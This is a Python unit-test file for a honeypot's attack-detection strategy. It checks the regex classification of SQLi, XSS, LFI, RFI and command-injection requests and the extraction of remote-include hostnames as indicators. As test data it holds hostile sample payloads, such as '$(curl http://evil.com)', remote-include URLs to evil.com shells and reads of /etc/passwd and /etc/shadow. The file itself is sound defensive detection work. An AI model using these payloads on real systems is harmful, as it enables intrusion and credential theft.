from unittest.mock import Mock, patch

from django.test import override_settings

from greedybear.consts import PAYLOAD_REQUEST, SCANNER
from greedybear.cronjobs.extraction.strategies.tanner import (
    TANNER_ATTACK_PATTERNS,
    TANNER_HONEYPOT,
    TannerExtractionStrategy,
)

from . import ExtractionTestCase


@override_settings(THREATFOX_API_KEY="")
class TestTannerExtractionStrategy(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    def test_extract_scanner_ips(self, mock_threatfox, mock_iocs_from_hits):
        mock_ioc = self._create_mock_ioc("1.2.3.4")
        mock_iocs_from_hits.return_value = [mock_ioc]
        self.strategy.ioc_processor.add_ioc = Mock(return_value=mock_ioc)

        hits = [{"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"}]
        self.strategy.extract_from_hits(hits)

        mock_iocs_from_hits.assert_called_once_with(hits)
        self.strategy.ioc_processor.add_ioc.assert_any_call(mock_ioc, attack_type=SCANNER, honeypot_name=TANNER_HONEYPOT)
        self.assertEqual(len(self.strategy.ioc_records), 1)
        mock_threatfox.assert_called_once()

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    def test_none_ioc_record_skipped(self, mock_iocs_from_hits):
        mock_ioc = self._create_mock_ioc()
        mock_iocs_from_hits.return_value = [mock_ioc]
        self.strategy.ioc_processor.add_ioc = Mock(return_value=None)

        hits = [{"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"}]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(len(self.strategy.ioc_records), 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    def test_multiple_scanners(self, mock_threatfox, mock_iocs_from_hits):
        ioc1 = self._create_mock_ioc("1.2.3.4")
        ioc2 = self._create_mock_ioc("5.6.7.8")
        mock_iocs_from_hits.return_value = [ioc1, ioc2]
        self.strategy.ioc_processor.add_ioc = Mock(side_effect=[ioc1, ioc2])

        hits = [
            {"src_ip": "1.2.3.4", "dest_port": 80, "@timestamp": "2025-01-01T00:00:00"},
            {"src_ip": "5.6.7.8", "dest_port": 443, "@timestamp": "2025-01-01T00:00:00"},
        ]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(len(self.strategy.ioc_records), 2)


class TestTannerAttackDetection(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    def test_sqli_union_select(self):
        text = "/search?q=1 UNION SELECT username, password FROM users--"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_sqli_or_bypass(self):
        text = "/login?user=admin' OR '1'='1"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_sqli_sleep(self):
        text = "/page?id=1; SLEEP(5)--"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_sqli_information_schema(self):
        text = "/page?id=1 UNION SELECT table_name FROM information_schema.tables"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("sqli", result)

    def test_xss_script_tag(self):
        text = "/comment?body=<script>alert('xss')</script>"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_xss_event_handler(self):
        text = "/page?q=<img onerror=alert(1) src=x>"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_xss_javascript_protocol(self):
        text = "/redirect?url=javascript:alert(document.cookie)"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("xss", result)

    def test_lfi_path_traversal(self):
        text = "/page?file=../../../etc/passwd"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_lfi_proc_self(self):
        text = "/read?path=/proc/self/environ"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_lfi_php_wrapper(self):
        text = "/include?page=php://filter/convert.base64-encode/resource=index.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)

    def test_rfi_include_url(self):
        text = "/page?file=include http://evil.com/shell.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("rfi", result)

    def test_rfi_remote_php(self):
        text = "/page?file=http://evil.com/backdoor.php"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("rfi", result)

    def test_cmd_injection_semicolon(self):
        text = "/ping?host=127.0.0.1; cat /etc/passwd"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_cmd_injection_pipe(self):
        text = "/dns?host=example.com | id"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_cmd_injection_backtick(self):
        text = "/page?name=`whoami`"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_cmd_injection_subshell(self):
        text = "/page?q=$(cat /etc/passwd)"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("cmd_injection", result)

    def test_multiple_attack_types_in_one_request(self):
        text = "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"
        result = self.strategy._detect_attack_types(text)
        self.assertIn("lfi", result)
        self.assertIn("xss", result)

    def test_benign_request_no_match(self):
        text = "/index.html?page=about&lang=en"
        result = self.strategy._detect_attack_types(text)
        self.assertEqual(result, [])

    def test_empty_text_no_match(self):
        result = self.strategy._detect_attack_types("")
        self.assertEqual(result, [])


class TestTannerRequestTextExtraction(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    def test_url_field(self):
        hit = {"url": "/search?q=test", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/search?q=test", text)

    def test_path_field_fallback(self):
        hit = {"path": "/api/data", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/api/data", text)

    def test_post_data_included(self):
        hit = {"url": "/login", "post_data": "user=admin&pass=test", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("user=admin&pass=test", text)

    def test_body_field_included(self):
        hit = {"url": "/api", "body": '{"key": "value"}', "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn('{"key": "value"}', text)

    def test_url_encoded_payload_decoded(self):
        hit = {"url": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("<script>alert(1)</script>", text)

    def test_plus_in_query_decoded_as_space(self):
        # + in a URL query string encodes a space; must be normalised so
        # regex patterns using \s+ match (e.g. UNION+SELECT → UNION SELECT).
        hit = {"url": "/page?id=UNION+SELECT+1", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("UNION SELECT 1", text)

    def test_plus_in_body_decoded_as_space(self):
        # form-encoded POST bodies also use + as a space separator.
        hit = {"url": "/login", "post_data": "user=admin+evil&cmd=id%3Bwhoami", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("user=admin evil", text)
        self.assertIn("cmd=id;whoami", text)

    def test_empty_hit_returns_empty(self):
        hit = {"src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertEqual(text, "")

    def test_url_takes_precedence_over_path(self):
        hit = {"url": "/from-url", "path": "/from-path", "src_ip": "1.2.3.4"}
        text = self.strategy._extract_request_text(hit)
        self.assertIn("/from-url", text)


@override_settings(THREATFOX_API_KEY="")
class TestTannerAttackClassification(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_sqli_tagged(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT * FROM users"}]
        self.strategy.extract_from_hits(hits)

        # check if tag was added
        found = False
        for call in mock_add_tags.call_args_list:
            _, tags = call[0]
            for tag in tags:
                if tag["ioc_id"] == mock_ioc_record.id and tag["value"] == "sqli":
                    found = True
                    break
        self.assertTrue(found, "Tag sqli not added")

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_sqli_plus_encoded_detected(self, mock_add_tags, mock_iocs_from_hits):
        """UNION+SELECT (+ as space in query string) must be detected as SQLi."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1+UNION+SELECT+*+FROM+users"}]
        self.strategy.extract_from_hits(hits)

        # check if tag was added
        found = False
        for call in mock_add_tags.call_args_list:
            _, tags = call[0]
            for tag in tags:
                if tag["ioc_id"] == mock_ioc_record.id and tag["value"] == "sqli":
                    found = True
                    break
        self.assertTrue(found, "Tag sqli not added")

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_mixed_attacks_produce_multiple_tags(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"}]
        self.strategy.extract_from_hits(hits)

        tag_values = [tag["value"] for call in mock_add_tags.call_args_list for tag in call[0][1]]
        self.assertIn("lfi", tag_values)
        self.assertIn("xss", tag_values)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_benign_request_no_tags(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        hits = [{"src_ip": "1.2.3.4", "url": "/index.html?page=about"}]
        self.strategy.extract_from_hits(hits)
        mock_add_tags.assert_called_once_with("tanner", [])

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_missing_src_ip_skipped(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        hits = [{"url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)
        mock_add_tags.assert_called_once_with("tanner", [])

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_unknown_scanner_ip_skipped(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        self.mock_ioc_repo.get_ioc_by_name.return_value = None
        hits = [{"src_ip": "9.9.9.9", "url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)
        mock_add_tags.assert_called_once_with("tanner", [])

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_new_tag_increments_counter(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1; SLEEP(5)--"}]
        self.strategy.extract_from_hits(hits)

        self.assertGreater(self.strategy.attack_tags_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_existing_tag_not_counted(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 0

        hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT *"}]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(self.strategy.attack_tags_added, 0)


@override_settings(THREATFOX_API_KEY="")
class TestTannerRfiExtraction(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_hostname_as_payload_request(self, mock_add_tags, mock_threatfox, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record

        mock_add_tags.return_value = 1

        rfi_ioc_record = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc_record)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [call for call in self.strategy.ioc_processor.add_ioc.call_args_list if call[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        self.assertEqual(payload_calls[0][0][0].name, "evil.com")
        self.assertEqual(payload_calls[0][1]["honeypot_name"], TANNER_HONEYPOT)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_links_scanner_to_hostname(self, mock_add_tags, mock_threatfox, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        scanner_record = self._create_mock_ioc("1.2.3.4")
        hostname_record = self._create_mock_ioc("evil.com", ioc_type="domain")

        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner_record,
            "evil.com": hostname_record,
        }.get(name)

        mock_add_tags.return_value = 1
        self.strategy.ioc_processor.add_ioc = Mock(return_value=hostname_record)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        scanner_record.related_ioc.add.assert_called_with(hostname_record)
        hostname_record.related_ioc.add.assert_called_with(scanner_record)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_same_hostname_deduplicated(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        # Two URLs with the same hostname in one request
        hits = [{"src_ip": "1.2.3.4", "url": "/a?file=include http://evil.com/shell.php&b=include http://evil.com/backdoor.php"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [call for call in self.strategy.ioc_processor.add_ioc.call_args_list if call[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_counter(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        self.assertGreater(self.strategy.rfi_hostnames_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_invalid_url_no_crash(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        self.strategy.ioc_processor.add_ioc = Mock(return_value=None)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http:///shell.php"}]
        self.strategy.extract_from_hits(hits)

        self.assertEqual(self.strategy.rfi_hostnames_added, 0)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_sensor_attached_to_ioc(self, mock_add_tags, mock_iocs_from_hits):
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        mock_sensor = Mock()
        mock_sensor.address = "10.0.0.1"

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php", "_sensor": mock_sensor}]
        self.strategy.extract_from_hits(hits)

        call_args = self.strategy.ioc_processor.add_ioc.call_args_list
        payload_calls = [c for c in call_args if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        ioc_arg = payload_calls[0][0][0]
        self.assertEqual(ioc_arg._sensors_to_add, [mock_sensor])

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_outer_param_stripped_from_url(self, mock_add_tags, mock_iocs_from_hits):
        """URL without a query string: '&' is an outer request separator and must be stripped."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        # The '&b=next' after the path has no preceding '?', so it is an outer param
        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php&b=next"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        submitted_url = payload_calls[0][0][0].related_urls[0]
        self.assertEqual(submitted_url, "http://evil.com/shell.php")

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_query_string_params_preserved(self, mock_add_tags, mock_iocs_from_hits):
        """URL with a real query string: '&' within the query must NOT be stripped."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        full_url = "http://evil.com/shell.php?cmd=wget&host=10.0.0.1"
        hits = [{"src_ip": "1.2.3.4", "url": f"/page?file={full_url}"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        submitted_url = payload_calls[0][0][0].related_urls[0]
        self.assertEqual(submitted_url, full_url)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_trailing_delimiters_stripped_from_url(self, mock_add_tags, mock_iocs_from_hits):
        """Trailing ')', ',', ';' characters must be stripped from extracted URLs."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php),;"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        submitted_url = payload_calls[0][0][0].related_urls[0]
        self.assertEqual(submitted_url, "http://evil.com/shell.php")

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_timestamp_set_on_ioc(self, mock_add_tags, mock_iocs_from_hits):
        """first_seen and last_seen on the RFI IOC must match the hit's @timestamp."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php", "@timestamp": "2025-06-01T12:00:00"}]
        self.strategy.extract_from_hits(hits)

        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)
        ioc_arg = payload_calls[0][0][0]
        from datetime import datetime

        expected_time = datetime.fromisoformat("2025-06-01T12:00:00")
        self.assertEqual(ioc_arg.first_seen, expected_time)
        self.assertEqual(ioc_arg.last_seen, expected_time)

    @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
    def test_rfi_missing_timestamp_no_crash(self, mock_add_tags, mock_iocs_from_hits):
        """Missing @timestamp must not crash; IOC is still created without explicit timestamps."""
        mock_iocs_from_hits.return_value = []
        mock_ioc_record = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
        mock_add_tags.return_value = 1

        rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)

        # No @timestamp key
        hits = [{"src_ip": "1.2.3.4", "url": "/page?file=http://evil.com/shell.php"}]
        self.strategy.extract_from_hits(hits)

        # Just verify no crash and IOC was still submitted
        payload_calls = [c for c in self.strategy.ioc_processor.add_ioc.call_args_list if c[1].get("attack_type") == PAYLOAD_REQUEST]
        self.assertEqual(len(payload_calls), 1)


class TestTannerAddFks(ExtractionTestCase):
    def setUp(self):
        super().setUp()
        self.strategy = TannerExtractionStrategy(
            honeypot="Tanner",
            ioc_repo=self.mock_ioc_repo,
            sensor_repo=self.mock_sensor_repo,
        )

    def test_add_fks_both_exist(self):
        scanner = self._create_mock_ioc("1.2.3.4")
        hostname = self._create_mock_ioc("evil.com", ioc_type="domain")

        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner,
            "evil.com": hostname,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        scanner.related_ioc.add.assert_called_once_with(hostname)
        hostname.related_ioc.add.assert_called_once_with(scanner)
        self.assertEqual(self.mock_ioc_repo.save.call_count, 0)

    def test_add_fks_scanner_none(self):
        hostname = self._create_mock_ioc("evil.com", ioc_type="domain")
        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "evil.com": hostname,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        hostname.related_ioc.add.assert_not_called()

    def test_add_fks_hostname_none(self):
        scanner = self._create_mock_ioc("1.2.3.4")
        self.mock_ioc_repo.get_ioc_by_name.side_effect = lambda name: {
            "1.2.3.4": scanner,
        }.get(name)

        self.strategy._add_fks("1.2.3.4", "evil.com")

        scanner.related_ioc.add.assert_not_called()


class TestTannerAttackPatterns(ExtractionTestCase):
    """Validates TANNER_ATTACK_PATTERNS regexes against known payloads."""

    def test_sqli_payloads(self):
        payloads = [
            "1 UNION SELECT * FROM users",
            "admin' OR '1'='1",
            "1; DROP TABLE users",
            "1; SLEEP(5)",
            "CONCAT(username, password)",
            "1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
            "/* bypass */ 1=1",
        ]
        for p in payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["sqli"].search(p), f"SQLi missed: {p}")

    def test_sqli_benign(self):
        benign = ["/about", "/users/123", "Hello world", "SELECT a nice day"]
        for t in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["sqli"].search(t), f"SQLi false positive: {t}")

    def test_xss_payloads(self):
        payloads = [
            "<script>alert(1)</script>",
            "javascript:alert(document.cookie)",
            "<img onerror=alert(1) src=x>",
            "<svg onload=alert(1)>",
            "eval('malicious')",
            "document.write('xss')",
        ]
        for p in payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["xss"].search(p), f"XSS missed: {p}")

    def test_xss_benign(self):
        benign = ["/about", "Just a normal text with <b>bold</b>", "Buy scripts and novels"]
        for t in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["xss"].search(t), f"XSS false positive: {t}")

    def test_lfi_payloads(self):
        payloads = [
            "../../../etc/passwd",
            "....//....//etc/shadow",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index",
            "data://text/plain;base64,PD9waHAgc3lzdGVtK",
            "expect://id",
        ]
        for p in payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["lfi"].search(p), f"LFI missed: {p}")

    def test_lfi_benign(self):
        benign = ["/images/photo.jpg", "/api/v2/data", "normal filepath.txt"]
        for t in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["lfi"].search(t), f"LFI false positive: {t}")

    def test_rfi_payloads(self):
        payloads = [
            "include http://evil.com/shell.php",
            "file=https://attacker.net/backdoor.txt",
            "require http://evil.com/payload.asp",
            "http://badsite.org/malware.cgi",
        ]
        for p in payloads:
            self.assertIsNotNone(TANNER_ATTACK_PATTERNS["rfi"].search(p), f"RFI missed: {p}")

    def test_rfi_benign(self):
        benign = ["/about", "Visit our website", "file=report.pdf"]
        for t in benign:
            self.assertIsNone(TANNER_ATTACK_PATTERNS["rfi"].search(t), f"RFI false positive: {t}")

    def test_cmd_injection_payloads(self):
        payloads = [
            "; cat /etc/passwd",
            "| id",
            "&& whoami",
            "`uname -a`",
            "$(curl http://evil.com)",
            "/bin/sh -c id",
            "> /tmp/output",
        ]
        for p in payloads:
            self.assertIsNotNone(
                TANNER_ATTACK_PATTERNS["cmd_injection"].search(p),
                f"CmdInj missed: {p}",
            )

    def test_cmd_injection_benign(self):
        benign = ["/about", "Hello world", "normal text here", "price: $100"]
        for t in benign:
            self.assertIsNone(
                TANNER_ATTACK_PATTERNS["cmd_injection"].search(t),
                f"CmdInj false positive: {t}",
            )
